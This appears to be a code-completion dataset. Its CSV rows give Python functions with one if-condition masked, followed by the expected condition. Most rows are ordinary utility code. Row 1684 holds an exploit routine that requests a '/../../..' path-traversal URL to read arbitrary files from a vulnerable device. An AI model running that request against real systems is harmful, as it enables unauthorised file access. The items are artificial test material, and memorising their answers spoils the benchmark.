1644,"def get_all_missing_headers(self):<tab># Heavy operation done in one optimized shot<tab>for chunk_height, expected_hash in reversed(list(self.checkpoints.items())):<tab><tab>if chunk_height in self.known_missing_checkpointed_chunks:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>self.known_missing_checkpointed_chunks.add(chunk_height)<tab>return self.known_missing_checkpointed_chunks","if self . chunk_hash ( chunk_height , 1000 ) != expected_hash :",125
1645,"def get_byname(userId, documentName, session=None):<tab>if not session:<tab><tab>session = db.Session<tab>ret = {}<tab>result = (<tab><tab>session.query(LegacyArchiveDocument)<tab><tab>.filter_by(userId=userId, documentName=documentName)<tab><tab>.first()<tab>)<tab>if result:<tab><tab>obj = dict(<tab><tab><tab>(key, value)<tab><tab><tab>for key, value in vars(result).items()<tab><tab><tab><IF-STMT><tab><tab>)<tab><tab>ret = obj<tab>return ret","if not key . startswith ( ""_"" )",141
1646,"def cb(ipdb, msg, action):<tab>if action == ""RTM_NEWLINK"" and msg.get_attr(""IFLA_IFNAME"", """") in (ifP1, ifP2):<tab><tab>obj = ipdb.interfaces[msg[""index""]]<tab><tab><IF-STMT><tab><tab><tab>ipdb.interfaces[ifM].add_port(obj)<tab><tab>try:<tab><tab><tab>ipdb.interfaces[ifM].commit()<tab><tab>except Exception:<tab><tab><tab>pass",if obj not in ipdb . interfaces [ ifM ] :,124
1647,"def reorder_encoder_rules(self, nts):<tab>""""""reorder rules so that any rules with ENCODER_PREFERRED is first""""""<tab>for nt in nts.values():<tab><tab>first_rules = []<tab><tab>rest_of_the_rules = []<tab><tab>for r in nt.rules:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>first_rules.append(r)<tab><tab><tab>else:<tab><tab><tab><tab>rest_of_the_rules.append(r)<tab><tab>nt.rules = first_rules + rest_of_the_rules","if r . conditions . contains ( ""ENCODER_PREFERRED"" ) :",143
1648,"def update_url(self, s, keywords):<tab>pc = self<tab>w = pc.ensure_text_widget()<tab>pc.show()<tab>if 1:<tab><tab>w.setPlainText("""")<tab>else:<tab><tab>url = pc.get_url(s, ""@url"")<tab><tab><IF-STMT><tab><tab><tab>w.setPlainText(""@url %s"" % url)<tab><tab>else:<tab><tab><tab>w.setPlainText(""@url: no url given"")",if url :,113
1649,"def _update_engines(self, engines):<tab>""""""Update our engines dict and _ids from a dict of the form: {id:uuid}.""""""<tab>for k, v in iteritems(engines):<tab><tab>eid = int(k)<tab><tab><IF-STMT><tab><tab><tab>self._ids.append(eid)<tab><tab>self._engines[eid] = v<tab>self._ids = sorted(self._ids)<tab>if (<tab><tab>sorted(self._engines.keys()) != list(range(len(self._engines)))<tab><tab>and self._task_scheme == ""pure""<tab><tab>and self._task_socket<tab>):<tab><tab>self._stop_scheduling_tasks()",if eid not in self . _engines :,173
1650,def test_delete_chat_thread(self):<tab>async with self.chat_client:<tab><tab>await self._create_thread()<tab><tab>await self.chat_client.delete_chat_thread(self.thread_id)<tab><tab># delete created users and chat threads<tab><tab><IF-STMT><tab><tab><tab>await self.chat_client.delete_chat_thread(self.thread_id),if not self . is_playback ( ) :,98
1651,"def _to_protobuf_matrix(matrix, p_matrix, transformation=None):<tab>for row in matrix:<tab><tab>p_row = p_matrix.rows.add()<tab><tab>for cell in row:<tab><tab><tab>value = cell<tab><tab><tab><IF-STMT><tab><tab><tab><tab>value = transformation(value)<tab><tab><tab>p_row.cells.append(value)",if transformation :,88
1652,"def apply(self, db, family):<tab>if self.rtype:<tab><tab><IF-STMT><tab><tab><tab>if self.regex[0].search(str(family.get_relationship())) is None:<tab><tab><tab><tab>return False<tab><tab>elif self.rtype != family.get_relationship():<tab><tab><tab>return False<tab>return True",if self . rtype . is_custom ( ) and self . use_regex :,93
1653,"def get_somatic_variantcallers(items):<tab>""""""Retrieve all variant callers for somatic calling, handling somatic/germline.""""""<tab>out = []<tab>for data in items:<tab><tab>vcs = dd.get_variantcaller(data)<tab><tab><IF-STMT><tab><tab><tab>vcs = vcs[""somatic""]<tab><tab>if not isinstance(vcs, (list, tuple)):<tab><tab><tab>vcs = [vcs]<tab><tab>out += vcs<tab>return set(vcs)","if isinstance ( vcs , dict ) and ""somatic"" in vcs :",133
1654,"def balancer_list_members(self, balancer):<tab>lb = self._get_balancer_model(balancer.id)<tab>members = []<tab>vs = self._locate_service_group(lb, balancer.port)<tab>if vs:<tab><tab><IF-STMT><tab><tab><tab>srvgrp = vs[""serviceGroups""][0]<tab><tab><tab>members = [self._to_member(srv, balancer) for srv in srvgrp[""services""]]<tab>return members","if vs [ ""serviceGroups"" ] :",112
1655,"def https_open(self, req):<tab>try:<tab><tab>return self.do_open(do_connection, req)<tab>except Exception as err_msg:<tab><tab>try:<tab><tab><tab>error_msg = str(err_msg.args[0]).split(""] "")[1] + "".""<tab><tab>except IndexError:<tab><tab><tab>error_msg = str(err_msg.args[0]) + "".""<tab><tab><IF-STMT><tab><tab><tab>if settings.VERBOSITY_LEVEL < 2:<tab><tab><tab><tab>print(settings.FAIL_STATUS)<tab><tab>else:<tab><tab><tab>if settings.VERBOSITY_LEVEL < 1:<tab><tab><tab><tab>print("""")<tab><tab>print(settings.print_critical_msg(error_msg))<tab><tab>raise SystemExit()",if settings . INIT_TEST == True :,187
1656,"def add_libdirs(self, envvar, sep, fatal=False):<tab>v = os.environ.get(envvar)<tab>if not v:<tab><tab>return<tab>for dir in str.split(v, sep):<tab><tab>dir = str.strip(dir)<tab><tab>if not dir:<tab><tab><tab>continue<tab><tab>dir = os.path.normpath(dir)<tab><tab>if os.path.isdir(dir):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.library_dirs.append(dir)<tab><tab>elif fatal:<tab><tab><tab>fail(""FATAL: bad directory %s in environment variable %s"" % (dir, envvar))",if not dir in self . library_dirs :,159
1657,"def check_placement_group_index(placement_group: PlacementGroup, bundle_index: int):<tab>assert placement_group is not None<tab>if placement_group.id.is_nil():<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""If placement group is not set, ""<tab><tab><tab><tab>""the value of bundle index must be -1.""<tab><tab><tab>)<tab>elif bundle_index >= placement_group.bundle_count or bundle_index < -1:<tab><tab>raise ValueError(<tab><tab><tab>f""placement group bundle index {bundle_index} ""<tab><tab><tab>f""is invalid. Valid placement group indexes: ""<tab><tab><tab>f""0-{placement_group.bundle_count}""<tab><tab>)",if bundle_index != - 1 :,178
1658,"def incoming():<tab>while True:<tab><tab>m = ws.receive()<tab><tab>if m is not None:<tab><tab><tab>m = str(m)<tab><tab><tab>print((m, len(m)))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>ws.close()<tab><tab><tab><tab>break<tab><tab>else:<tab><tab><tab>break<tab>print((""Connection closed!"",))",if len ( m ) == 35 :,94
1659,"def walk_tree(<tab>root: Element,<tab>processor: Callable[[Element], Optional[_T]],<tab>stop_after_first: bool = False,) -> List[_T]:<tab>results = []<tab>queue = deque([root])<tab>while queue:<tab><tab>currElement = queue.popleft()<tab><tab>for child in currElement:<tab><tab><tab>if child:<tab><tab><tab><tab>queue.append(child)<tab><tab><tab>result = processor(child)<tab><tab><tab>if result is not None:<tab><tab><tab><tab>results.append(result)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return results<tab>return results",if stop_after_first :,152
1660,"def _find_node_with_predicate(self, node, predicate):<tab>if node != self._tree._root and predicate(node):<tab><tab>return node<tab>item, cookie = self._tree.GetFirstChild(node)<tab>while item:<tab><tab><IF-STMT><tab><tab><tab>return item<tab><tab>if self._tree.ItemHasChildren(item):<tab><tab><tab>result = self._find_node_with_predicate(item, predicate)<tab><tab><tab>if result:<tab><tab><tab><tab>return result<tab><tab>item, cookie = self._tree.GetNextChild(node, cookie)<tab>return None",if predicate ( item ) :,143
1661,"def traverse_coords(coords, dst_coords):<tab>for p in coords:<tab><tab><IF-STMT><tab><tab><tab>lst = []<tab><tab><tab>traverse_coords(p, lst)<tab><tab><tab>dst_coords.append(lst)<tab><tab>else:<tab><tab><tab>x, y = p[0], p[1]<tab><tab><tab>d = (x + (y - b) * m) / (1 + m * m)<tab><tab><tab>x2 = 2 * d - x<tab><tab><tab>y2 = 2 * d * m - y + 2 * b<tab><tab><tab>dst_coords.append((x2, y2))<tab>return dst_coords",if type ( p [ 0 ] ) is list :,161
1662,"def normalize_replies(self, x):<tab>xs = x.split(""\n"")<tab>xs2 = []<tab>for x in xs:<tab><tab><IF-STMT><tab><tab><tab># Normalize the sentence appearing after 'your persona:'<tab><tab><tab>x = x[len(""your persona: "") :]<tab><tab><tab>x = normalize_reply(x)<tab><tab><tab>x = ""your persona: "" + x<tab><tab>else:<tab><tab><tab>x = normalize_reply(x)<tab><tab>xs2.append(x)<tab>return ""\n"".join(xs2)","if ""your persona:"" in x :",142
1663,"def run_unittest(*classes):<tab>suite = unittest.TestSuite()<tab>for c in classes:<tab><tab><IF-STMT><tab><tab><tab>c = __import__(c)<tab><tab><tab>for name in dir(c):<tab><tab><tab><tab>obj = getattr(c, name)<tab><tab><tab><tab>if isinstance(obj, type) and issubclass(obj, unittest.TestCase):<tab><tab><tab><tab><tab>suite.addTest(obj)<tab><tab>else:<tab><tab><tab>suite.addTest(c)<tab>runner = unittest.TestRunner()<tab>result = runner.run(suite)","if isinstance ( c , str ) :",136
1664,"def bprop_naive(self, error, permute=False):<tab>for dst in range(self.ofmsize):<tab><tab>rflinks = self.links[dst]<tab><tab>A = error[:, self.ofmlocs[dst]]<tab><tab>B = self.weights<tab><tab><IF-STMT><tab><tab><tab>inds = np.random.permutation(A.shape[1])<tab><tab><tab>np.dot(A[:, inds], B[inds, :], self.bpropbuf)<tab><tab>else:<tab><tab><tab>np.dot(A, B, self.bpropbuf)<tab><tab>self.berror[:, rflinks] += self.bpropbuf",if permute :,150
1665,"def rewrite_order_lookup_key(model, lookup_key):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>return ""-"" + rewrite_lookup_key(model, lookup_key[1:])<tab><tab>else:<tab><tab><tab>return rewrite_lookup_key(model, lookup_key)<tab>except AttributeError:<tab><tab>return lookup_key","if lookup_key . startswith ( ""-"" ) :",85
1666,"def test_default_configuration(self):<tab>transformations = []<tab>for i in range(2):<tab><tab>transformation, original = self._test_helper(RescalingChoice, dataset=""boston"")<tab><tab># The maximum is around 1.95 for the transformed array...<tab><tab>self.assertAlmostEqual(np.mean(transformation), 0, places=5)<tab><tab>self.assertAlmostEqual(np.std(transformation), 1, places=5)<tab><tab>self.assertFalse((original == transformation).all())<tab><tab>transformations.append(transformation)<tab><tab><IF-STMT><tab><tab><tab>self.assertTrue((transformations[-1] == transformations[-2]).all())",if len ( transformations ) > 1 :,157
1667,"def test_get_filter_text(self):<tab>with realized(self.b):<tab><tab><IF-STMT><tab><tab><tab>self.assertEqual(self.b.get_filter_text(), u"""")<tab><tab><tab>self.assertTrue(isinstance(self.b.get_filter_text(), str))<tab><tab><tab>self.b.filter_text(u""foo"")<tab><tab><tab>self.assertEqual(self.b.get_filter_text(), u""foo"")<tab><tab><tab>self.assertTrue(isinstance(self.b.get_filter_text(), str))",if self . b . can_filter_text ( ) :,138
1668,"def _namelist(instance):<tab>namelist, namedict, classlist = [], {}, [instance.__class__]<tab>for c in classlist:<tab><tab>for b in c.__bases__:<tab><tab><tab>classlist.append(b)<tab><tab>for name in c.__dict__.keys():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>namelist.append(name)<tab><tab><tab><tab>namedict[name] = 1<tab>return namelist",if not namedict . has_key ( name ) :,107
1669,"def resolve_cloudtrail_payload(self, payload):<tab>sources = self.data.get(""sources"", [])<tab>events = []<tab>for e in self.data.get(""events""):<tab><tab>if not isinstance(e, dict):<tab><tab><tab>events.append(e)<tab><tab><tab>event_info = CloudWatchEvents.get(e)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab>else:<tab><tab><tab>event_info = e<tab><tab><tab>events.append(e[""event""])<tab><tab>sources.append(event_info[""source""])<tab>payload[""detail""] = {""eventSource"": list(set(sources)), ""eventName"": events}",if event_info is None :,159
1670,"def __setitem__(self, aset, c):<tab>if isinstance(aset, tuple):<tab><tab><IF-STMT><tab><tab><tab>row = self.rownames.index(aset[0])<tab><tab>else:<tab><tab><tab>row = aset[0]<tab><tab>if isinstance(aset[1], str):<tab><tab><tab>column = self.colnames.index(aset[1])<tab><tab>else:<tab><tab><tab>column = aset[1]<tab><tab>self.cell_value(row, column, c)<tab>else:<tab><tab>Matrix.__setitem__(self, aset, c)","if isinstance ( aset [ 0 ] , str ) :",144
1671,"def test_retrieve_robots_token_permission(<tab>username, is_admin, with_permissions, app, client):<tab>with client_with_identity(username, client) as cl:<tab><tab>params = {""orgname"": ""buynlarge"", ""token"": ""true""}<tab><tab><IF-STMT><tab><tab><tab>params[""permissions""] = ""true""<tab><tab>result = conduct_api_call(cl, OrgRobotList, ""GET"", params, None)<tab><tab>assert result.json[""robots""]<tab><tab>for robot in result.json[""robots""]:<tab><tab><tab>assert (robot.get(""token"") is not None) == is_admin<tab><tab><tab>assert (robot.get(""repositories"") is not None) == (<tab><tab><tab><tab>is_admin and with_permissions<tab><tab><tab>)",if with_permissions :,192
1672,"def _analyze_ast(contents):<tab>try:<tab><tab>return ast.literal_eval(contents)<tab>except SyntaxError:<tab><tab>pass<tab>try:<tab><tab># remove all comments<tab><tab>contents = re.sub(re.compile(r""/\*.*?\*/"", re.DOTALL), """", contents)<tab><tab>contents = re.sub(re.compile(r""#.*?\n""), """", contents)<tab><tab># remove anything before dict declaration like: ""caps = { ...""<tab><tab>match = re.match(r""^([^{]+)"", contents)<tab><tab><IF-STMT><tab><tab><tab>contents = contents.replace(match.group(1), """")<tab><tab># and try again<tab><tab>return ast.literal_eval(contents)<tab>except SyntaxError:<tab><tab>pass<tab>return False",if match :,179
1673,"def bulk_disable_accounts(account_names):<tab>""""""Bulk disable accounts""""""<tab>for account_name in account_names:<tab><tab>account = Account.query.filter(Account.name == account_name).first()<tab><tab><IF-STMT><tab><tab><tab>app.logger.debug(""Disabling account %s"", account.name)<tab><tab><tab>account.active = False<tab><tab><tab>db.session.add(account)<tab>db.session.commit()<tab>db.session.close()",if account :,113
1674,"def _add_agent_rewards(self, reward_dict: Dict[AgentID, float]) -> None:<tab>for agent_id, reward in reward_dict.items():<tab><tab><IF-STMT><tab><tab><tab>self.agent_rewards[agent_id, self.policy_for(agent_id)] += reward<tab><tab><tab>self.total_reward += reward<tab><tab><tab>self._agent_reward_history[agent_id].append(reward)",if reward is not None :,108
1675,"def wrapper(strategy, backend, pipeline_index, *args, **kwargs):<tab>current_partial = partial_prepare(<tab><tab>strategy, backend, pipeline_index, *args, **kwargs<tab>)<tab>out = (<tab><tab>func(<tab><tab><tab>strategy=strategy,<tab><tab><tab>backend=backend,<tab><tab><tab>pipeline_index=pipeline_index,<tab><tab><tab>current_partial=current_partial,<tab><tab><tab>*args,<tab><tab><tab>**kwargs<tab><tab>)<tab><tab>or {}<tab>)<tab>if not isinstance(out, dict):<tab><tab>strategy.storage.partial.store(current_partial)<tab><tab><IF-STMT><tab><tab><tab>strategy.session_set(PARTIAL_TOKEN_SESSION_NAME, current_partial.token)<tab>return out",if save_to_session :,185
1676,def restore_text(self):<tab>if self.source_is_console():<tab><tab>cb = self._last_console_cb<tab>else:<tab><tab>cb = self._last_editor_cb<tab>if cb is None:<tab><tab><IF-STMT><tab><tab><tab>self.plain_text.clear()<tab><tab>else:<tab><tab><tab>self.rich_text.clear()<tab>else:<tab><tab>func = cb[0]<tab><tab>args = cb[1:]<tab><tab>func(*args)<tab><tab>if get_meth_class_inst(func) is self.rich_text:<tab><tab><tab>self.switch_to_rich_text()<tab><tab>else:<tab><tab><tab>self.switch_to_plain_text(),if self . is_plain_text_mode ( ) :,180
1677,"def extract_groups(self, text: str, language_code: str):<tab>previous = None<tab>group = 1<tab>groups = []<tab>words = []<tab>ignored = IGNORES.get(language_code, {})<tab>for word in NON_WORD.split(text):<tab><tab>if not word:<tab><tab><tab>continue<tab><tab>if word not in ignored and len(word) >= 2:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>group += 1<tab><tab><tab>elif group > 1:<tab><tab><tab><tab>groups.append(group)<tab><tab><tab><tab>words.append(previous)<tab><tab><tab><tab>group = 1<tab><tab>previous = word<tab>if group > 1:<tab><tab>groups.append(group)<tab><tab>words.append(previous)<tab>return groups, words",if previous == word :,187
1678,"def pendingcalls_thread(self, context):<tab>try:<tab><tab>self.pendingcalls_submit(context.l, context.n)<tab>finally:<tab><tab>with context.lock:<tab><tab><tab>context.nFinished += 1<tab><tab><tab>nFinished = context.nFinished<tab><tab><tab>if False and support.verbose:<tab><tab><tab><tab>print(""finished threads: "", nFinished)<tab><tab><IF-STMT><tab><tab><tab>context.event.set()",if nFinished == context . nThreads :,113
1679,"def __getattr__(self, item: str) -> Any:<tab>if hasattr(MissingPandasLikeRolling, item):<tab><tab>property_or_func = getattr(MissingPandasLikeRolling, item)<tab><tab><IF-STMT><tab><tab><tab>return property_or_func.fget(self)  # type: ignore<tab><tab>else:<tab><tab><tab>return partial(property_or_func, self)<tab>raise AttributeError(item)","if isinstance ( property_or_func , property ) :",105
1680,"def _csv(self, match=None, dump=None):<tab>if dump is None:<tab><tab>dump = self._dump(match)<tab>for record in dump:<tab><tab>row = []<tab><tab>for field in record:<tab><tab><tab>if isinstance(field, int):<tab><tab><tab><tab>row.append(""%i"" % field)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>row.append("""")<tab><tab><tab>else:<tab><tab><tab><tab>row.append(""'%s'"" % field)<tab><tab>yield "","".join(row)",elif field is None :,126
1681,"def get_default_dict(section_definition):<tab>section_key = section_definition.get(""key"")<tab>if section_key == ""global"":<tab><tab>section_key += ""_""<tab>if ""cluster"" == section_key:<tab><tab>section_key += (<tab><tab><tab>""_sit""<tab><tab><tab><IF-STMT><tab><tab><tab>else ""_hit""<tab><tab>)<tab>default_dict = DefaultDict[section_key].value<tab>return default_dict","if section_definition . get ( ""cluster_model"" ) == ClusterModel . SIT . name",125
1682,"def scan_resource_conf(self, conf):<tab>subscription = re.compile(r""\/|\/subscriptions\/[\w\d-]+$|\[subscription\(\).id\]"")<tab>if ""properties"" in conf:<tab><tab><IF-STMT><tab><tab><tab>if any(<tab><tab><tab><tab>re.match(subscription, scope)<tab><tab><tab><tab>for scope in conf[""properties""][""assignableScopes""]<tab><tab><tab>):<tab><tab><tab><tab>if ""permissions"" in conf[""properties""]:<tab><tab><tab><tab><tab>if conf[""properties""][""permissions""]:<tab><tab><tab><tab><tab><tab>for permission in conf[""properties""][""permissions""]:<tab><tab><tab><tab><tab><tab><tab>if ""actions"" in permission and ""*"" in permission[""actions""]:<tab><tab><tab><tab><tab><tab><tab><tab>return CheckResult.FAILED<tab>return CheckResult.PASSED","if ""assignableScopes"" in conf [ ""properties"" ] :",197
1683,"def hard_update(self, cache, size_change, pins_gates):<tab>""""""replace verts, rads and vel (in NumPy)""""""<tab>verts, rads, vel, react = cache<tab>if len(verts) == self.v_len:<tab><tab>if pins_gates[0] and pins_gates[1]:<tab><tab><tab>unpinned = self.params[""unpinned""]<tab><tab><tab>self.verts[unpinned] = verts[unpinned]<tab><tab>else:<tab><tab><tab>self.verts = verts<tab><tab>self.vel = vel<tab><tab><IF-STMT><tab><tab><tab>self.rads = rads",if not size_change :,155
1684,"def run(self):<tab>if self.check():<tab><tab>path = ""/../../../../../../../../../../../..{}"".format(self.filename)<tab><tab>response = self.http_request(method=""GET"", path=path)<tab><tab>if response is None:<tab><tab><tab>return<tab><tab><IF-STMT><tab><tab><tab>print_success(""Success! File: %s"" % self.filename)<tab><tab><tab>print_info(response.text)<tab><tab>else:<tab><tab><tab>print_error(""Exploit failed"")<tab>else:<tab><tab>print_error(""Device seems to be not vulnerable"")",if response . status_code == 200 and response . text :,153
1685,"def write_text(self, text):<tab>""""""Writes re-indented text into the buffer.""""""<tab>should_indent = False<tab>rows = []<tab>for row in text.split(""\n""):<tab><tab>if should_indent:<tab><tab><tab>row = ""<tab>{}"".format(row)<tab><tab>if ""\b"" in row:<tab><tab><tab>row = row.replace(""\b"", """", 1)<tab><tab><tab>should_indent = True<tab><tab><IF-STMT><tab><tab><tab>should_indent = False<tab><tab>rows.append(row)<tab>self.write(""{}\n"".format(""\n"".join(rows)))",elif not len ( row . strip ( ) ) :,147
1686,"def default_logger():<tab>""""""A logger used to output seed information to nosetests logs.""""""<tab>logger = logging.getLogger(__name__)<tab># getLogger() lookups will return the same logger, but only add the handler once.<tab>if not len(logger.handlers):<tab><tab>handler = logging.StreamHandler(sys.stderr)<tab><tab>handler.setFormatter(logging.Formatter(""[%(levelname)s] %(message)s""))<tab><tab>logger.addHandler(handler)<tab><tab><IF-STMT><tab><tab><tab>logger.setLevel(logging.INFO)<tab>return logger",if logger . getEffectiveLevel ( ) == logging . NOTSET :,131
1687,"def while1_test(a, b, c):<tab>while 1:<tab><tab>if a != 2:<tab><tab><tab>if b:<tab><tab><tab><tab>a = 3<tab><tab><tab><tab>b = 0<tab><tab><tab><IF-STMT><tab><tab><tab><tab>c = 0<tab><tab><tab>else:<tab><tab><tab><tab>a += b + c<tab><tab><tab><tab>break<tab>return a, b, c",elif c :,94
1688,"def fetch():<tab>retval = {}<tab>content = retrieve_content(__url__)<tab>if __check__ in content:<tab><tab>for line in content.split(""\n""):<tab><tab><tab>line = line.strip()<tab><tab><tab>if not line or line.startswith(""#"") or ""."" not in line:<tab><tab><tab><tab>continue<tab><tab><tab>if "" # "" in line:<tab><tab><tab><tab>reason = line.split("" # "")[1].split()[0].lower()<tab><tab><tab><tab><IF-STMT>  # too many false positives<tab><tab><tab><tab><tab>continue<tab><tab><tab><tab>retval[line.split("" # "")[0]] = (__info__, __reference__)<tab>return retval","if reason == ""scanning"" :",157
1689,"def create_order(order, shopify_settings, old_order_sync=False, company=None):<tab>so = create_sales_order(order, shopify_settings, company)<tab>if so:<tab><tab><IF-STMT><tab><tab><tab>create_sales_invoice(<tab><tab><tab><tab>order, shopify_settings, so, old_order_sync=old_order_sync<tab><tab><tab>)<tab><tab>if order.get(""fulfillments"") and not old_order_sync:<tab><tab><tab>create_delivery_note(order, shopify_settings, so)","if order . get ( ""financial_status"" ) == ""paid"" :",144
1690,"def __getitem__(self, key):<tab>if isinstance(key, numbers.Number):<tab><tab>l = len(self)<tab><tab>if key >= l:<tab><tab><tab>raise IndexError(""Index %s out of range (%s elements)"" % (key, l))<tab><tab><IF-STMT><tab><tab><tab>if key < -l:<tab><tab><tab><tab>raise IndexError(""Index %s out of range (%s elements)"" % (key, l))<tab><tab><tab>key += l<tab><tab>return self(key + 1)<tab>elif isinstance(key, slice):<tab><tab>raise ValueError(<tab><tab><tab>self.impl.__class__.__name__ + "" object does not support slicing""<tab><tab>)<tab>else:<tab><tab>return self(key)",if key < 0 :,170
1691,"def load_checks(path=None, subpkg=""""):<tab>""""""Dynamically import all check modules for the side effect of registering checks.""""""<tab>if path is None:<tab><tab>path = os.path.dirname(__file__)<tab>modules = []<tab>for name in os.listdir(path):<tab><tab>if os.path.isdir(os.path.join(path, name)):<tab><tab><tab>modules = modules + load_checks(<tab><tab><tab><tab>os.path.join(path, name), subpkg + ""."" + name<tab><tab><tab>)<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>modules.append(import_module(__package__ + subpkg + ""."" + name[:-3]))<tab>return modules","if name . endswith ( "".py"" ) and name not in LOADER_EXCLUDES :",174
1692,"def _remove_temporary_files(self, temporary_files):<tab>""""""Internal function for cleaning temporary files""""""<tab>for file_object in temporary_files:<tab><tab>file_name = file_object.name<tab><tab>file_object.close()<tab><tab>if os.path.exists(file_name):<tab><tab><tab>os.remove(file_name)<tab><tab>arff_file_name = file_name + "".arff""<tab><tab><IF-STMT><tab><tab><tab>os.remove(arff_file_name)",if os . path . exists ( arff_file_name ) :,129
1693,"def search_rotate(array, val):<tab>low, high = 0, len(array) - 1<tab>while low <= high:<tab><tab>mid = (low + high) // 2<tab><tab>if val == array[mid]:<tab><tab><tab>return mid<tab><tab>if array[low] <= array[mid]:<tab><tab><tab>if array[low] <= val <= array[mid]:<tab><tab><tab><tab>high = mid - 1<tab><tab><tab>else:<tab><tab><tab><tab>low = mid + 1<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>low = mid + 1<tab><tab><tab>else:<tab><tab><tab><tab>high = mid - 1<tab>return -1",if array [ mid ] <= val <= array [ high ] :,166
1694,"def match_file(self, file, tff_format):<tab>match = tff_format.search(file.filename.replace(""\\"", ""/""))<tab>if match:<tab><tab>result = {}<tab><tab>for name, value in match.groupdict().items():<tab><tab><tab>value = value.strip()<tab><tab><tab>if name in self.numeric_tags:<tab><tab><tab><tab>value = value.lstrip(""0"")<tab><tab><tab><IF-STMT><tab><tab><tab><tab>value = value.replace(""_"", "" "")<tab><tab><tab>result[name] = value<tab><tab>return result<tab>else:<tab><tab>return {}",if self . ui . replace_underscores . isChecked ( ) :,149
1695,"def exclude_pkgs(self, pkgs):<tab># :api<tab>name = ""excludepkgs""<tab>if pkgs is not None and pkgs != []:<tab><tab><IF-STMT><tab><tab><tab>self._set_value(name, pkgs, dnf.conf.PRIO_COMMANDLINE)<tab><tab>else:<tab><tab><tab>logger.warning(<tab><tab><tab><tab>_(""Unknown configuration option: %s = %s""), ucd(name), ucd(pkgs)<tab><tab><tab>)",if self . _has_option ( name ) :,113
1696,"def button_press_cb(self, tdw, event):<tab>if self.zone in (_EditZone.CREATE_AXIS, _EditZone.DELETE_AXIS):<tab><tab>button = event.button<tab><tab><IF-STMT><tab><tab><tab>self._click_info = (button, self.zone)<tab><tab><tab>return False<tab>return super(SymmetryEditMode, self).button_press_cb(tdw, event)",if button == 1 and event . type == Gdk . EventType . BUTTON_PRESS :,114
1697,"def declare_var(<tab>self,<tab>type_name: Union[str, Tuple[str, str]],<tab>*,<tab>var_name: str = """",<tab>var_name_prefix: str = ""v"",<tab>shared: bool = False,) -> str:<tab>if shared:<tab><tab><IF-STMT><tab><tab><tab>var_name = var_name_prefix<tab><tab>if var_name not in self.shared_vars:<tab><tab><tab>self.declarations.append((var_name, type_name))<tab><tab><tab>self.shared_vars.add(var_name)<tab>else:<tab><tab>if not var_name:<tab><tab><tab>var_name = self.get_var_name(var_name_prefix)<tab><tab>self.declarations.append((var_name, type_name))<tab>return var_name",if not var_name :,197
1698,"def get_module_map(module, module_path):<tab>""""""Map true modules to exported name""""""<tab>if not module_is_public(module):<tab><tab>return {}<tab>m = {}<tab>for symbol_name in dir(module):<tab><tab>if symbol_name.startswith(""_""):<tab><tab><tab>continue<tab><tab>symbol = getattr(module, symbol_name)<tab><tab>symbol_path = ""%s.%s"" % (module_path, symbol_name)<tab><tab>m[symbol] = symbol_path<tab><tab><IF-STMT><tab><tab><tab>m.update(get_module_map(symbol, symbol_path))<tab>return m",if inspect . ismodule ( symbol ) :,152
1699,"def build_properties(self):<tab>self.properties = set()<tab>if self.module.partial_scan == True:<tab><tab># For partial scans, only check the most common properties values<tab><tab>for prop in self.COMMON_PROPERTIES:<tab><tab><tab>self.properties.add(chr(prop))<tab>else:<tab><tab>for pb in range(0, 9):<tab><tab><tab>for lp in range(0, 5):<tab><tab><tab><tab>for lc in range(0, 5):<tab><tab><tab><tab><tab>prop = self.build_property(pb, lp, lc)<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab><tab>self.properties.add(chr(prop))",if prop is not None :,166
1700,"def getFileIdFromAlternateLink(altLink):<tab>loc = altLink.find(""/d/"")<tab><IF-STMT><tab><tab>fileId = altLink[loc + 3 :]<tab><tab>loc = fileId.find(""/"")<tab><tab>if loc != -1:<tab><tab><tab>return fileId[:loc]<tab>else:<tab><tab>loc = altLink.find(""/folderview?id="")<tab><tab>if loc > 0:<tab><tab><tab>fileId = altLink[loc + 15 :]<tab><tab><tab>loc = fileId.find(""&"")<tab><tab><tab>if loc != -1:<tab><tab><tab><tab>return fileId[:loc]<tab>controlflow.system_error_exit(<tab><tab>2, f""{altLink} is not a valid Drive File alternateLink""<tab>)",if loc > 0 :,180
1701,"def _coerce_trials_data(data, path):<tab>if not isinstance(data, list):<tab><tab>if not isinstance(data, dict):<tab><tab><tab>raise BatchFileError(<tab><tab><tab><tab>path,<tab><tab><tab><tab>""invalid data type for trials: expected list or dict""<tab><tab><tab><tab>"", got %s"" % type(data).__name__,<tab><tab><tab>)<tab><tab>data = [data]<tab>for item in data:<tab><tab><IF-STMT><tab><tab><tab>raise BatchFileError(<tab><tab><tab><tab>path, ""invalid data type for trial %r: expected dict"" % item<tab><tab><tab>)<tab>return data","if not isinstance ( item , dict ) :",152
1702,"def remove(self, *objs):<tab>val = getattr(self.instance, attname)<tab>for obj in objs:<tab><tab># Is obj actually part of this descriptor set?<tab><tab><IF-STMT><tab><tab><tab>setattr(obj, rel_field.name, None)<tab><tab><tab>obj.save()<tab><tab>else:<tab><tab><tab>raise rel_field.rel.to.DoesNotExist(<tab><tab><tab><tab>""%r is not related to %r."" % (obj, self.instance)<tab><tab><tab>)","if getattr ( obj , rel_field . attname ) == val :",130
